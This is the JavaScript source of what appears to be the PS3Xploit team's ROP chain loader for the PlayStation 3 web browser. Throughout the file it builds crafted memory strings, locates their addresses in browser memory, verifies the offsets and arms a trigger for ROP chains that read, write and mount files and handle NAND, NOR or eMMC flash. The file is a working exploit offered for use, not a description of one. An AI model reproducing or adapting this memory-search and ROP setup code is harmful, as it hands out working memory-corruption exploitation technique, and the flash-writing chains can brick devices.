// PS3 Default Template ROP Chain Loader
// PS3Xploit Team 2018 / ps3xploit.com


//function initROP(type)
function initROP()
{
	try
	{
		// Store Selected Flash Type Backup For Searching
		ftype=type;
		
		str2u_adjusted=false;// reset str2u adjust
		
		// Reset Flag
		allOffsetsFound=false;
		
		//if(auto_reload){reload_page();}
		
		// Set some values from web page
		setPathNames();
		//alert("path_src: " + path_src + "\npath_dest: " + path_dest);
		
		// Check For Default Page Settings
		if(default_settings){setArgsFromPage();}
		
		// Disable Set Args Button Alerts On Certain Chains
		//if(chain_stackframe==="beep_test"||"db_rebuild"||"mem_dump_test"){page_args_set=true;}
		
		// Check if page args set
		//if(!page_args_set){alert(msg_page_args_not_set);return;}
		
		// Check For Input Values
		if(chain_stackframe===""){alert(msg_no_chain_selected);marked_hex.focus();return;}
		//if(search_size===""){alert("No Search Size Selected\n\nUse The Drop-Down Box To Select One");return;}
		
			
		// Reset Timeout Value
		t_out=0;
		
		total_loops++;
		
		// Log Entry
		if(debug_mode){log_div = logEntry();}
		
		// Check to make sure values are not corrupt
		if(search_max_threshold===0){search_max_threshold = search_max_threshold_backup;}// search threshold reset if zero
		if(search_base_offset<search_base_offset_min){search_base_offset = search_base_offset_min;}// if too low
		if(search_base_offset>search_base_offset_max){search_base_offset = search_base_offset_min+search_base_offset_adjust;}// if too high
		if(base_fp_addr===0){search_base_offset = search_base_offset_min;}// reset start offset for search if zero
		
		// reset string search message to fail if total=max (fix later)
		if(total_loops===max_loops){result_msg=msg_string_verify_fail;}
			
		toggleDisableButtons(true);
		hideElement("debug-alert", true);// hide debug output button by default
		
		found_offsets=[];
			
		// Check Flash Type
		switch(type)
		{
			case 0:
			flash_type=nand_flag;
			st_sec=0x204;
			break;
			case 1:
			flash_type=nor_flag;
			st_sec=0x178;
			break;
			case 2:
			flash_type=emmc_flag;
			st_sec=0x204;
			break;
		}
		
		resetOffsetAddresses();
		
		
		if((!base_found)&&(!base_verified))
		{
			//Default Pointer Values
			usb_fp=0x40404040;
			usb_fp2=0x41414141;
			hdd_fp=0x0000001C;
			hdd_fp2=0x43434343;
			usb_fd2=0x45454545;
			hdd_fd=0x46464646;
			hdd_fd2=0x47474747;
			fd=0x48484848;
			fd2=0x49494949;
			magic=0x4A4A4A4A;
			
			// Set bytes to write for db_rebuild and restore_stack for others
			if(chain_stackframe==="db_rebuild"){write_bytes=db_rebuild_bytes;}else{write_bytes=restore_stack;}
			
			// Set values for AutoSize Read/Write Chains
			if((chain_stackframe==="file_read_write_test")&&(useAutoSize)){hdd_fd=g_set_r3_from_r29;}
			
			// Set mount params
			if(chain_stackframe==="sys_fs_mount"){path_fp="CELL_FS_UTILITY:HDD1";path_fp2=" CELL_FS_SIMPLEFS";path_src_fp=" /dev_hdd1";}
		
		
			// Find File Pointers
			ph = 0x6CFD;
			base_fp=unescape("\u4242\u0000\u0102\u0304")+hexw2bin(g_2)+hexw2bin(g_toc)+unescape("\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900")+hexw2bin(setFileMode("wb"))+hexw2bin(write_bytes)+hexw2bin(usb_fp)+hexw2bin(usb_fp2)+hexw2bin(hdd_fp)+hexw2bin(hdd_fp2)+hexw2bin(usb_fd)+hexw2bin(usb_fd2)+hexw2bin(hdd_fd)+hexw2bin(hdd_fd2)+hexw2bin(fd)+hexw2bin(fd2)+hexw2bin(magic)+unescape("\u0000")+str2u(path_fp)+unescape("\u0000")+str2u(path_fp2)+unescape("\u0000")+str2u(path_src_fp)+unescape("\u0000")+str2u(path_dest_fp)+unescape("\u0000\uFD6C");
			
			do
			{
				if(search_max_threshold<search_range_size){
				if(total_loops<max_loops){reloadInitROP();}
				else{searchFail();}
				return;}
				base_fp=base_fp.replaceAt(0,hexh2bin(ph));
				base_fp_addr=findJsVariableOffset("base_fp",base_fp,search_base_offset,search_range_size,debug_mode);
				search_max_threshold-=search_range_size;
			}while(base_fp_addr==0);
			
			// Pointer Address Offsets
			stackframe_bin_addr=base_fp_addr+0x68;
			file_mode_fp_addr=stackframe_bin_addr+0x2;
			write_bytes_addr=stackframe_bin_addr+0x4;
			usb_fp_addr=stackframe_bin_addr+0x8;
			usb_fp2_addr=stackframe_bin_addr+0xC;
			hdd_fp_addr=stackframe_bin_addr+0x10;
			hdd_fp2_addr=stackframe_bin_addr+0x14;
			usb_fd_addr=stackframe_bin_addr+0x18;
			usb_fd2_addr=stackframe_bin_addr+0x1C;
			hdd_fd_addr=stackframe_bin_addr+0x20;
			hdd_fd2_addr=stackframe_bin_addr+0x24;
			fd_addr=stackframe_bin_addr+0x28;
			fd2_addr=stackframe_bin_addr+0x2C;
			magic_addr=stackframe_bin_addr+0x30;
			
			// Path Strings
			path_fp_addr=stackframe_bin_addr+0x38;
			path_fp2_addr=path_fp_addr+path_fp.length;
			
			path_src_fp_addr=path_fp2_addr+path_fp2.length+0x2;
			
			if(str2u_adjusted)
			{
				path_dest_fp_addr=path_src_fp_addr+path_src_fp.length+0x3;
			}
			else
			{
				path_dest_fp_addr=path_src_fp_addr+path_src_fp.length+0x2;
			}
			
			// Super Hacky Way to fix mount for now :)
			if(chain_stackframe==="sys_fs_mount"){path_fp_addr=path_fp_addr-0x2;path_fp2_addr=path_fp2_addr+0x1;path_src_fp_addr=path_src_fp_addr+0x2;}
			
		}
		base_found=true;
		
		// Skip Stackframe Search
		showFoundOffsets(offset_find_stack_frame);
		stack_frame=unescape("\u0000\u0000");// dummy
		stack_frame_addr=base_fp_addr+0x4;
		stk_found=true;
		
		// if(!base_verified){base=checkMemory(base_fp_addr-0x4,0x100,base_fp.length,6);}
		// if(base===base_fp){base_verified=true;stk_verified=true;}else{base_verified=false;base_found=false;stk_found=false;stk_verified=false;}
		
		
		
		// Find Jump 2 Pointer
		showFoundOffsets(offset_find_jump2);
		if((!j2_found)&&(!j2_verified))
		{
			jump_2=unescape("\u4141\u0000")+hexw2bin(stack_frame_addr)+unescape("\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950")+hexw2bin(stack_frame_addr)+unescape("\uFB7E");
			ph = 0x7EFB;
			search_base_offset=search_base_offset_min+search_base_offset_adjust_jump2;
			do
			{
				if(search_max_threshold<search_range_size){
				if(total_loops<max_loops){reloadInitROP();}
				else{searchFail();}
				return;}
				jump_2=jump_2.replaceAt(0,hexh2bin(ph));
				jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base_offset,search_range_size,debug_mode);
				search_max_threshold-=search_range_size;
			}while(jump_2_addr==0);
		}
		j2_found=true;
		// if(!j2_verified){j2=checkMemory(jump_2_addr-0x4,0x100,jump_2.length,6);}
		// if(j2===jump_2){j2_verified=true;}else{j2_verified=false;j2_found=false;}
		
		
		// Find Jump 1 Pointer
		showFoundOffsets(offset_find_jump1);
		if((!j1_found)&&(!j1_verified))
		{
			jump_1=unescape("\u4141\u0000")+hexw2bin(jump_2_addr)+unescape("\uBF6E");
			ph = 0x6EBF;
			search_base_offset=search_base_offset_min+search_base_offset_adjust_jump1;
			do
			{
				if(search_max_threshold<search_range_size){
				if(total_loops<max_loops){reloadInitROP();}
				else{searchFail();}
				return;}
				jump_1=jump_1.replaceAt(0,hexh2bin(ph));
				jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base_offset,search_range_size,debug_mode);
				search_max_threshold-=search_range_size;
			}while(jump_1_addr==0);
		}
		j1_found=true;
		// if(!j1_verified){j1=checkMemory(jump_1_addr-0x4,0x100,jump_1.length,6);}
		// if(j1===jump_1){j1_verified=true;}else{j1_verified=false;j1_found=false;}
		
		
		// All Offsets Have Been Found At This Point
		allOffsetsFound=true;
		showFoundOffsets(offset_find_success);
		
		// Trigger Exploit
		if (verify_offsets)
		{
		
			// Verify Offsets
			if(!base_verified){base=checkMemory(base_fp_addr-0x4,0x100,base_fp.length,6);}
			if(base===base_fp){base_verified=true;stk_verified=true;}else{base_verified=false;base_found=false;stk_found=false;stk_verified=false;}
			if(!j2_verified){j2=checkMemory(jump_2_addr-0x4,0x100,jump_2.length,6);}
			if(j2===jump_2){j2_verified=true;}else{j2_verified=false;j2_found=false;}
			if(!j1_verified){j1=checkMemory(jump_1_addr-0x4,0x100,jump_1.length,6);}
			if(j1===jump_1){j1_verified=true;}else{j1_verified=false;j1_found=false;}
			
			// If not verified, then reset status for search
			if((base_fp_addr!=0)&&(base_verified)&&(jump_2_addr!=0)&&(j2_verified)&&(jump_1_addr!=0)&&(j1_verified)){allOffsetsVerified=true;}else{resetOffsetAddresses();initROP();}
			
			if(allOffsetsVerified)
			{
				if(debug_mode)logAdd(verify_success);
				if(t_out!=0){searchResetTimeout();}
				searchSucceed();
				enableActiveTrigger();
				load_rop.focus();
				offsets_verified=true;
				result_msg=msg_verified_offsets;// change to verified status
				showFoundOffsets(offset_find_success);
			}
			else 
			{
				if(debug_mode)logAdd(verify_fail);
				if(total_loops<max_loops){reloadInitROP();}
				else{failCount+1;searchFail();}
				reload_page.focus();
			}
		}
		else
		{
			if(t_out!=0){searchResetTimeout();}
			if(debug_mode)logAdd(verify_skip);
			searchSucceed();
			enableActiveTrigger();
			load_rop.focus();
			showFoundOffsets(offset_find_success);
		}
		
		// Log Crap For Garbage Collection
		logForGC();
	} 
	catch(e) 
	{
		if(debug_mode){logAdd(e, log_div);}
	}
}